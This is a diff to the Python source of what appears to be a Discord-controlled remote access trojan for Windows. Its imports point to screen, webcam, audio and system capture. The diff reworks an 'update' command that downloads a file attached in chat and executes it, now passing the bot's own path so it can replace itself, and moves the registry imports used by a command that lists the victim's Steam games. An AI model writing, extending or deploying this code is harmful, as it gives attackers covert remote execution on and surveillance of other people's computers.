@@ -29,6 +29,8 @@ import base64
 import ctypes
 import psutil
 import shutil
+import winreg
+import glob
 import json
 import time
 import uuid
@@ -36,6 +38,7 @@ import wave
 import cv2
 import mss
 import sys
+import vdf
 import wmi
 import io
 import os
@@ -78,7 +81,7 @@ async def update(ctx):
         save_path = os.path.join(os.path.dirname(sys.argv[0]), attachment.filename)
         await attachment.save(save_path)
         
-        subprocess.Popen([save_path, "--hidewindow"], shell=True)
+        subprocess.Popen([save_path, f'--targetpath="{os.path.abspath(sys.argv[0])}"'], shell=True)
         await ctx.send(f"Updater `{attachment.filename}` has been downloaded and executed.")
     except Exception as e:
         await ctx.send(f"Could not process the update. {str(e)}", empherial=True)
@@ -956,30 +959,22 @@ async def liststartapps(ctx):
 
 @bot.command(help="Lists installed Steam games with paths.")
 async def liststeamapps(ctx):
-    import os, glob
-    try:
-        import winreg
-    except Exception:
-        winreg = None
-    import vdf
-
     def get_steam_path():
         paths = []
-        if winreg:
-            try:
-                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam") as k:
-                    p, _ = winreg.QueryValueEx(k, "SteamPath")
-                    if p: paths.append(p)
-            except Exception:
-                pass
-            for root in (winreg.HKEY_LOCAL_MACHINE,):
-                for sub in (r"SOFTWARE\WOW6432Node\Valve\Steam", r"SOFTWARE\Valve\Steam"):
-                    try:
-                        with winreg.OpenKey(root, sub) as k:
-                            p, _ = winreg.QueryValueEx(k, "InstallPath")
-                            if p: paths.append(p)
-                    except Exception:
-                        pass
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam") as k:
+                p, _ = winreg.QueryValueEx(k, "SteamPath")
+                if p: paths.append(p)
+        except Exception:
+            pass
+        for root in (winreg.HKEY_LOCAL_MACHINE,):
+            for sub in (r"SOFTWARE\WOW6432Node\Valve\Steam", r"SOFTWARE\Valve\Steam"):
+                try:
+                    with winreg.OpenKey(root, sub) as k:
+                        p, _ = winreg.QueryValueEx(k, "InstallPath")
+                        if p: paths.append(p)
+                except Exception:
+                    pass
         paths += [
             os.path.expandvars(r"%PROGRAMFILES(X86)%\Steam"),
             os.path.expandvars(r"%PROGRAMFILES%\Steam"),
